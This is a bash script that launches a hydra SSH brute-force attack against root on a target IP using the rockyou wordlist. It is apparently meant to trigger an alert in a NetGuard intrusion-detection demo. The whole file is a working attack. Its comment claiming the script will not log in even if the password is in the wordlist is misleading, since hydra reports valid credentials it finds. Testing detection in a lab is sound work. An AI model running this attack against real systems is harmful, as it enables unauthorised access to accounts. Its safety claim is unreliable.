#!/usr/bin/env bash
# brute_force.sh — SSH brute-force attack test script for NetGuard IDPS demonstration
#
# Prerequisites: hydra
#   Install: sudo apt-get install hydra
#   Wordlist: /usr/share/wordlists/rockyou.txt
#     (on Kali/Parrot it ships by default; elsewhere: sudo gunzip /usr/share/wordlists/rockyou.txt.gz)
#
# Usage:
#   TARGET_IP=<victim-ip> bash brute_force.sh
#   Example: TARGET_IP=192.168.1.100 bash brute_force.sh
#
# Expected detection in NetGuard:
#   Attack type : Brute Force
#   Rule        : BRUTE_FORCE_001
#   Target port : 22 (SSH)
#   Severity    : Medium → High (hydra sends ≥ 15 attempts within 60 s window)
#   Appears on dashboard within ~10 seconds of hydra starting
#
# Safe-use warning:
#   Run ONLY in an isolated lab/hackathon network.
#   Brute-forcing SSH on systems you do not own is illegal.
#   -t 4 limits parallelism; the script will NOT actually log in even if rockyou
#   contains the correct password unless you intend it to.

TARGET_IP="${TARGET_IP:-}"

if [ -z "$TARGET_IP" ]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Usage: TARGET_IP=<victim-ip> bash $0" >&2
    exit 1
fi

echo "[*] Starting SSH brute force → $TARGET_IP (user: root, 4 threads)..."
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://"$TARGET_IP"
echo "[*] Done. Check NetGuard dashboard for Brute Force alert."
